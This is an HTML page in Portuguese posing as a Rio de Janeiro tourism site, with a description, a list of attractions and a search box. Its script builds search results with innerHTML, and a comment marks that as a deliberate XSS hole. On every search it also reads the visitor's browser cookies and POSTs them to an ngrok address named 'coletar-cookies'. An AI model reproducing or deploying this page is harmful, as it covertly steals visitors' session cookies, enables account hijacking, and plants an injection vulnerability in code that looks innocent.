<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rio de Janeiro - Cidade Maravilhosa</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
        }
        header {
            background-color: #0077b6;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .content {
            padding: 20px;
        }
        .search-bar {
            margin-bottom: 20px;
            text-align: center;
        }
        .search-bar input {
            padding: 10px;
            width: 300px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .search-bar button {
            padding: 10px 20px;
            background-color: #0077b6;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        footer {
            background-color: #0077b6;
            color: white;
            text-align: center;
            padding: 10px;
            position: fixed;
            bottom: 0;
            width: 100%;
        }
    </style>
</head>
<body>
    <header>
        <h1>Rio de Janeiro - Cidade Maravilhosa e Perfeita</h1>
    </header>

    <div class="content">
        <div class="search-bar">
            <input type="text" id="searchInput" placeholder="Pesquisar...">
            <button onclick="performSearch()">Buscar</button>
        </div>

        <h2>Sobre o Rio de Janeiro</h2>
        <p>
            O Rio de Janeiro é uma grande cidade brasileira à beira-mar, famosa pelas praias de Copacabana e Ipanema, pela estátua de 38 metros de altura do Cristo Redentor, no topo do Corcovado, e pelo Pão de Açúcar, um pico de granito com teleféricos até seu cume. A cidade também é conhecida pelas grandes favelas. O empolgante Carnaval, com carros alegóricos, fantasias extravagantes e sambistas, é considerado o maior do mundo.
        </p>

        <h2>Pontos Turísticos</h2>
        <ul id="touristSpots">
            <li>Cristo Redentor</li>
            <li>Pão de Açúcar</li>
            <li>Praia de Copacabana</li>
            <li>Praia de Ipanema</li>
            <li>Floresta da Tijuca</li>
        </ul>

        <h2>História</h2>
        <p>
            O Rio de Janeiro foi fundado em 1565 pelos portugueses. Durante muitos anos, foi a capital do Brasil, até a construção de Brasília em 1960. A cidade é um importante centro cultural, econômico e político do país.
        </p>

        <div id="searchResults"></div>
    </div>

    <footer>
        <p>&copy; 2023 Rio de Janeiro - Todos os direitos reservados.</p>
    </footer>

    <script>
        function performSearch() {
            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
            const touristSpots = document.querySelectorAll('#touristSpots li');
            let found = false;
            const searchResultsDiv = document.getElementById('searchResults');

            // Limpa os resultados anteriores
            searchResultsDiv.innerHTML = '';

            touristSpots.forEach(spot => {
                if (spot.textContent.toLowerCase().includes(searchTerm)) {
                    found = true;
                    const result = document.createElement('p');
                    
                    // Tornando vulnerável a XSS usando innerHTML
                    result.innerHTML = `Resultado encontrado: ${spot.textContent}`;  // Aqui é onde ocorre a vulnerabilidade

                    searchResultsDiv.appendChild(result);
                }
            });

            if (!found) {
                searchResultsDiv.innerHTML = '<p>Nenhum ponto turístico encontrado.</p>';
            }

            // Enviar cookies para o servidor
            sendCookiesToServer();
        }

        function sendCookiesToServer() {
            const cookies = document.cookie;  // Captura os cookies do navegador
            const url = 'https://f9f6-177-192-8-19.ngrok-free.app/coletar-cookies';  // Seu URL ngrok

            // Exibe os cookies no console para depuração
            console.log("Cookies capturados:", cookies);

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ cookies: cookies })  // Envia os cookies no corpo da requisição
            })
            .then(response => response.json())
            .then(data => console.log('Cookies enviados com sucesso!', data))
            .catch(error => console.error('Erro ao enviar cookies:', error));
        }
    </script>
</body>
</html>
